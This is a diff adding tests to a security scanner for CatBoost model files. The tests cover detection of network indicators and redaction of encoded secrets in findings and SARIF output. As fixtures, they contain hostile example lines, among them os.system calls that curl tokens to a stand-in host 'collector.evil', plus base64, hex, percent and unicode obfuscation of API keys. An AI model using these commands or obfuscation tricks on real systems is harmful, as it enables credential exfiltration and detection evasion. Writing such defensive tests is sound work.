@@ -18,8 +18,11 @@ from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, Iss
 from modelaudit.scanners.catboost_scanner import (
     CatBoostScanner,
     _redact_evidence_for_display,
+    _redact_literal_collection_evidence,
     _redact_reversible_base64_evidence,
     _redact_reversible_hex_evidence,
+    _redact_reversible_percent_evidence,
+    _redact_reversible_unicode_evidence,
     _redact_split_base64_evidence,
 )
 from modelaudit.utils.file.detection import detect_file_format, detect_file_format_from_magic
@@ -275,6 +278,30 @@ def test_scan_detects_network_indicator_warning(tmp_path: Path) -> None:
     assert network_checks
     assert network_checks[0].status == CheckStatus.FAILED
     assert network_checks[0].severity == IssueSeverity.WARNING
+
+
+@pytest.mark.parametrize("indicator", ["8.8.8.8", "2001:4860:4860::8888"])
+def test_scan_detects_public_ip_network_indicators(tmp_path: Path, indicator: str) -> None:
+    model_path = tmp_path / "public_ip.cbm"
+    model_path.write_bytes(_build_cbm([f"resolver={indicator}"]))
+
+    result = CatBoostScanner().scan(str(model_path))
+
+    network_check = next(check for check in result.checks if check.name == "Network Indicator Check")
+    assert network_check.status == CheckStatus.FAILED
+    assert network_check.severity == IssueSeverity.WARNING
+    assert indicator in str(network_check.details)
+
+
+@pytest.mark.parametrize("indicator", ["999.999.999.999", "fd00::1"])
+def test_scan_ignores_invalid_or_private_ip_like_metadata(tmp_path: Path, indicator: str) -> None:
+    model_path = tmp_path / "benign_ip_like_metadata.cbm"
+    model_path.write_bytes(_build_cbm([f"model_version={indicator}"]))
+
+    result = CatBoostScanner().scan(str(model_path))
+
+    network_check = next(check for check in result.checks if check.name == "Network Indicator Check")
+    assert network_check.status == CheckStatus.PASSED
 
 
 def test_scan_redacts_urls_in_catboost_findings(tmp_path: Path) -> None:
@@ -1797,6 +1824,41 @@ def test_catboost_display_preserves_benign_split_base64_literals() -> None:
     assert _redact_split_base64_evidence(split_payload) == split_payload
 
 
+@pytest.mark.parametrize("collection", ["list", "tuple"])
+def test_catboost_display_redacts_base64_string_literal_collections(collection: str) -> None:
+    secret = "api_key=collectionsecret"
+    payload = base64.b64encode(secret.encode()).decode()
+    opening, closing = ("[", "]") if collection == "list" else ("(", ")")
+    literal = f'{opening}"{payload[:10]}", "{payload[10:]}"{closing}'
+    evidence = f'blob="".join({literal}); os.system("id")'
+
+    redacted = _redact_evidence_for_display(evidence, max_chars=500)
+
+    assert "collectionsecret" not in redacted
+    assert payload[:10] not in redacted
+    assert payload[10:] not in redacted
+    assert "api_key=<redacted>" in redacted
+    assert "os.system" in redacted
+    assert _redact_literal_collection_evidence(literal) == "api_key=<redacted>"
+
+
+def test_catboost_display_redacts_split_hex_string_literal_collection() -> None:
+    literal = r"['\x61\x70\x69\x5f', '\x6b\x65\x79\x3d', '\x68\x75\x6e\x74', '\x65\x72\x32']"
+
+    redacted = _redact_evidence_for_display(f'blob={literal}; os.system("id")', max_chars=500)
+
+    assert "hunter2" not in redacted
+    assert r"\x68\x75\x6e\x74" not in redacted
+    assert "api_key=<redacted>" in redacted
+    assert "os.system" in redacted
+
+
+def test_catboost_display_preserves_benign_string_literal_collection() -> None:
+    literal = '["ordinary ", "public metadata"]'
+
+    assert _redact_literal_collection_evidence(literal) == literal
+
+
 def test_catboost_display_redacts_percent_encoded_url_path_secret() -> None:
     evidence = 'os.system("curl https://collector.evil/upload/api_key%253Dabc%252Fdef/visible")'
 
@@ -1811,6 +1873,120 @@ def test_catboost_display_preserves_benign_percent_encoded_url_path() -> None:
     evidence = 'os.system("curl https://collector.evil/upload/tokenizer%3Dorg%252Fbert-base")'
 
     assert _redact_evidence_for_display(evidence, max_chars=500) == evidence
+
+
+def test_catboost_display_redacts_percent_encoded_provider_token_in_url_path() -> None:
+    evidence = 'os.system("curl https://collector.evil/upload/sk%2dAAAAAAAAAAAAAAAAAAAA")'
+
+    redacted = _redact_evidence_for_display(evidence, max_chars=500)
+
+    assert "sk%2dAAAAAAAAAAAAAAAAAAAA" not in redacted
+    assert "sk-AAAAAAAAAAAAAAAAAAAA" not in redacted
+    assert "https://collector.evil/upload/<redacted>" in redacted
+    assert "os.system" in redacted
+
+
+@pytest.mark.parametrize(
+    "evidence",
+    [
+        'payload="api_key%3Dhunter2"; os.system("id")',
+        'payload="api%255Fkey%253Dhunter3"; os.system("id")',
+        'payload="Authorization%3ABearer%20hunter4"; os.system("id")',
+    ],
+)
+def test_catboost_display_redacts_standalone_percent_encoded_assignments(evidence: str) -> None:
+    redacted = _redact_evidence_for_display(evidence, max_chars=500)
+
+    assert "hunter" not in redacted
+    assert "<redacted>" in redacted
+    assert "os.system" in redacted
+    assert _redact_reversible_percent_evidence(evidence) == redacted
+
+
+def test_catboost_display_preserves_benign_standalone_percent_encoding() -> None:
+    evidence = 'payload="tokenizer%3Dorg%252Fbert-base"; os.system("id")'
+
+    assert _redact_reversible_percent_evidence(evidence) == evidence
+
+
+def test_catboost_display_redacts_percent_encoded_provider_token() -> None:
+    evidence = 'import os; sk%2dAAAAAAAAAAAAAAAAAAAAAAAA; os.system("id")'
+
+    redacted = _redact_evidence_for_display(evidence, max_chars=500)
+
+    assert "sk%2dAAAAAAAAAAAAAAAAAAAAAAAA" not in redacted
+    assert "sk-AAAAAAAAAAAAAAAAAAAAAAAA" not in redacted
+    assert "<redacted>" in redacted
+    assert "os.system" in redacted
+
+
+@pytest.mark.parametrize(
+    "encoded_token",
+    [
+        r"\u0073\u006b\u002dAAAAAAAAAAAAAAAAAAAA",
+        r"\U00000073\U0000006b\U0000002dAAAAAAAAAAAAAAAAAAAA",
+        r"\163\153\055AAAAAAAAAAAAAAAAAAAA",
+    ],
+)
+def test_catboost_display_redacts_unicode_and_octal_escaped_provider_tokens(encoded_token: str) -> None:
+    evidence = f'import os; {encoded_token}; os.system("id")'
+
+    redacted = _redact_evidence_for_display(evidence, max_chars=500)
+
+    assert encoded_token not in redacted
+    assert "sk-AAAAAAAAAAAAAAAAAAAA" not in redacted
+    assert "<redacted>" in redacted
+    assert "os.system" in redacted
+
+
+def test_catboost_display_preserves_benign_unicode_escaped_assignment() -> None:
+    evidence = r"mode=\u0066\u0061\u0073\u0074"
+
+    assert _redact_reversible_unicode_evidence(evidence) == evidence
+
+
+def test_catboost_display_preserves_generic_key_without_command_context() -> None:
+    evidence = "key=feature_name; metadata=public"
+
+    assert _redact_evidence_for_display(evidence, max_chars=500) == evidence
+
+
+def test_catboost_sarif_redacts_composite_evidence_bypasses(tmp_path: Path) -> None:
+    split_secret = "api_key=collectionsecret"
+    split_payload = base64.b64encode(split_secret.encode()).decode()
+    evidence = [
+        f'blob="".join(["{split_payload[:10]}", "{split_payload[10:]}"]); os.system("id")',
+        'payload="api_key%3Dpercentsecret"; os.system("id")',
+        'client.set_secret(name="api_key", value="settersecret"); os.system("id")',
+        'auth=("alice", "authsecret"); os.system("id")',
+        'api\u200b_key=controlsecret; os.system("id")',
+        'config={chr(97)+chr(112)+chr(105)+chr(95)+chr(107)+chr(101)+chr(121): "numericsecret", '
+        '"cmd": "os.system(\\"id\\")"}',
+    ]
+    model_path = tmp_path / "catboost_composite_evidence.cbm"
+    model_path.write_bytes(_build_cbm(evidence))
+
+    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
+    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
+    sarif = format_sarif_output(result, [str(model_path)])
+
+    assert determine_exit_code(result) == 1
+    for secret in (
+        "collectionsecret",
+        split_payload[:10],
+        split_payload[10:],
+        "percentsecret",
+        "settersecret",
+        "authsecret",
+        "controlsecret",
+        "numericsecret",
+    ):
+        assert secret not in failed_details
+        assert secret not in sarif
+    assert "os.system" in failed_details
+    assert "<redacted>" in failed_details
+    assert "os.system" in sarif
+    assert "<redacted>" in sarif
 
 
 def test_catboost_sarif_redacts_additional_serialized_and_argument_secrets(tmp_path: Path) -> None:
